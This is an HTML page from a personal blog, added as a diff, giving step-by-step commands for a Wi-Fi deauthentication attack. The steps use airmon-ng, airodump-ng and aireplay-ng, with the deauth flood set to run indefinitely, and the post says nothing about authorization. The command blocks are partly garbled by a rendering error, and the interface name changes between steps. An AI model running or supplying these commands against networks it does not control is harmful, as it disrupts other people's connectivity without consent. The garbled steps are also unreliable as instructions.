@@ -1,0 +1,52 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0"><meta name="description" content="wifiDeauth [ Rohan's Blog ] "><meta name="theme-color" content="#ebc65a"><title>wifiDeauth [ Rohan's Blog ] </title><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css"><link rel="preload" href="https://cdn.bootcss.com/highlight.js/9.6.0/styles/github.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.6.0/styles/github.min.css"><link rel="preload" href="https://fonts.googleapis.com/css?family=Abril+Fatface&amp;display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface&amp;display=swap"><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css"><script src="https://cdn.bootcss.com/highlight.js/9.6.0/highlight.min.js" defer></script><script src="/js/paper.js" defer></script><script src="https://www.googletagmanager.com/gtag/js?id=xx-xxxxxxx-xx" async></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'xx-xxxxxxx-xx');</script><script src="https://www.unpkg.com/valine/dist/Valine.min.js" defer></script><script>window.addEventListener('DOMContentLoaded', () => {
+  new Valine({
+    el: '#comments',
+    appId: '1JY5EfOoNSaiEGcXhwrCs7dk-gzGzoHsz',
+    appKey: 'jXutXUNavOPDp92k9gQuMsv9',
+    notify:false,
+    verify:false,
+    avatar:'mp',
+    placeholder: '说几句',
+    visitor: true
+  })
+})</script><script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js" defer></script><script>window.addEventListener('DOMContentLoaded', () => {
+  tocbot.init({
+    // Where to render the table of contents.
+    tocSelector: '.toc__content',
+    // Where to grab the headings to build the table of contents.
+    contentSelector: '.article__content',
+    // Which headings to grab inside of the contentSelector element.
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    // For headings inside relative or absolute positioned containers within content.
+    hasInnerContainers: true,
+    orderedList: false,
+    collapseDepth: 2,
+  });
+})</script><meta name="generator" content="Hexo 4.2.0"></head><body><div class="mask-border"></div><div class="head"><div class="head__inner"><h1><a href="/">Rohan's Blog</a></h1><p></p></div></div><div class="paper-container"><div class="main"><div class="location-bar"><div class="line-1"><div class="horizontal-line" style="height: 3px"></div></div><div class="line-2"><div class="horizontal-line" style="height: 1px"></div></div><p class="text">wifiDeauth</p><div class="switch-button"><input class="container_toggle" type="checkbox" id="switch" name="mode"><label for="switch">Toggle</label></div><div class="line-3"><div class="horizontal-line" style="height: 1px"></div></div></div><div class="main__2-col"><article class="post-view__article"><div class="article__infomation"><div class="posts-item"><h2 class="posts-item__title"><a href="">wifiDeauth</a></h2><span class="post__date">2020-03-31</span></div></div><div class="article__content"><h1 id="Steps-for-a-successful-wifi-deauth-attack"><a href="#Steps-for-a-successful-wifi-deauth-attack" class="headerlink" title="Steps for a successful wifi deauth attack"></a>Steps for a successful wifi deauth attack</h1><blockquote>
+<p>You might have to run these as <code>sudo</code> (root). Also, do not be alarmed if your computer does not find your wifi card. A clean reboot will solve the issue.</p>
+</blockquote>
+<ol>
+<li><p>Get the name if your wireless card : the only one with information.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iwconfig<br></code></pre></td></tr></table></figure>
+<p>Mine was <code>wlp2s0</code>.</p>
+</li>
+<li><p>Put the boi is monitor mode. This is to allow it to monitor network traffic.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">airmon-ng start wlp2s0<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>Run <code>iwconfig</code> again. It should now have a <code>mon</code> at the end. Mine became <code>wlp2s0mon</code>.</p>
+</li>
+<li><p>Run</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">airodump-ng wlp2s0mon<br>``` <br>To see the list of routers and their corresponding WiFi names. Note the BSSID( that<span class="hljs-string">'s the Mac address) of the network of choice, and it'</span>s channel (CH).<br><br>5. Run<br>```bash<br>airodump-ng wlan0mon --bssid [routers BSSID here]--channel [routers channel here]<br></code></pre></td></tr></table></figure>
+<p>to see the devices connected to this WiFi. These appear under “Station”. It’s the mac address of the device</p>
+</li>
+</ol>
+<p>To find out what the device is, google the first 3 sections of the device’s mac address, and you can see the device manufacturer info and hence be able to identify the device.</p>
+<ol start="6">
+<li>Deauth! Run:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aireplay-ng --deauth 0 -c [DEVICES MAC ADDRESS] -a [ROUTERS MAC ADDRESS] wlp2s0mon<br></code></pre></td></tr></table></figure>
+0 is for infinite attacks, until manually stopped. Specify a number of choice for finite number of attacks.</li>
+</ol>
+<h3 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h3><p><a href="https://hackernoon.com/forcing-a-device-to-disconnect-from-wifi-using-a-deauthentication-attack-f664b9940142" target="_blank" rel="noopener">This cool hackernoon article.</a></p>
+</div></article><div class="post-view__sidebar"><div class="sidebar"><div class="tocbot"><h2>Toc</h2><div class="toc__content"></div></div><h2>Links</h2><div class="sidebar__link"><ul><li><a href="https://github.com/RohanGautam" target="_blank" rel="noopener">Github</a></li><li><a href="https://www.linkedin.com/in/rohangautam/" target="_blank" rel="noopener">LinkedIn</a></li></ul></div><h2>Archives</h2><div class="sidebar__archives"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a></li></ul></div><h2>Categories</h2><div class="sidebar__categories"></div><h2>Tags</h2><div class="sidebar__tags"></div></div></div></div><div class="horizontal-line" style="height: 1px"></div><div class="main__bottom"><div class="pre-next"><a class="pre-button">(No more)</a><a class="next-button" href="/2020/03/24/phantomToolbooth/">The Phantom Toolbooth</a></div></div></div></div><div class="footer"><span>©️2019-2020 Designed By&nbsp;<strong><a href="https://github.com/random-yang" target="_blank" rel="noopener">RandomYang</a></strong> Powered By&nbsp;</span><strong><a href="https://hexo.io" target="_blank" rel="noopener">hexo</a></strong></div><div class="darkmode-mask" id="darkmode-mask"></div><div class="sidebar__button"></div></body></html>
